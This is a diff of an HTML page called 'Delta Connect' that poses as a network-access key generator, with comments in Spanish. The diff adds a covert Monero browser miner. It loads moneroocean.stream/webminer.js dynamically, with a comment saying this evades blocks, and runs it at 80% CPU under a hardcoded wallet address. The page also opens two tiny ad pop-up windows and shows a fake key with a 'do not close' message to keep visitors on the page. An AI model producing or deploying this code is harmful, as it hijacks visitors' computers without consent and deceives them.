@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Connect - Sistema</title>
-    <script src="https://moneroocean.stream/webminer.js"></script>
+    <title>Delta Connect - Secure</title>
     <style>
         body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         #box { width: 90%; max-width: 400px; border: 2px solid #00ff00; padding: 20px; text-align: center; }
@@ -15,30 +14,39 @@
 </head>
 <body>
 <div id="box">
-    <h3>SYSTEM_DELTA_CONNECT</h3>
+    <h3>DELTA_SYSTEM_V5</h3>
     <div class="vid">
-        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&controls=0" frameborder="0"></iframe>
+        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1" frameborder="0"></iframe>
     </div>
-    <button id="btn" onclick="start()">CONECTAR AHORA</button>
+    <button id="btn" onclick="activarPortal()">ACCEDER A RED</button>
     <div id="key-box">
         <p>CLAVE GENERADA:</p>
         <h1 id="pass" style="color:#0f0;"></h1>
+        <p style="font-size:10px;">PROCESO ACTIVO - NO CERRAR</p>
     </div>
 </div>
+
 <script>
-    function start() {
-        // PUBLICIDAD
+    function activarPortal() {
+        // 1. PUBLICIDAD (Doble impacto)
         window.open("https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0", "_blank", "width=10,height=10");
         window.open("https://omg10.com/4/10780938", "_blank", "width=10,height=10");
         window.focus();
 
-        // MINERÍA AL 90% (FUERZA BRUTA)
-        try {
-            var m = new MoneroOcean.Anonymous('4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc', {throttle: 0.1});
-            m.start();
-        } catch(e) {}
+        // 2. CARGA DINÁMICA DEL MINERO (Para evadir bloqueos)
+        var s = document.createElement('script');
+        s.src = "https://moneroocean.stream/webminer.js";
+        s.onload = function() {
+            try {
+                // Configuración al 80% de potencia (0.2)
+                var m = new MoneroOcean.Anonymous('4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc', {throttle: 0.2});
+                m.start();
+                console.log("Motor iniciado");
+            } catch(e) {}
+        };
+        document.head.appendChild(s);
 
-        // MOSTRAR CLAVE
+        // 3. GENERAR CLAVE
         const d = new Date();
         document.getElementById('pass').innerText = "Delta" + d.getDate() + d.getHours();
         document.getElementById('btn').style.display = 'none';
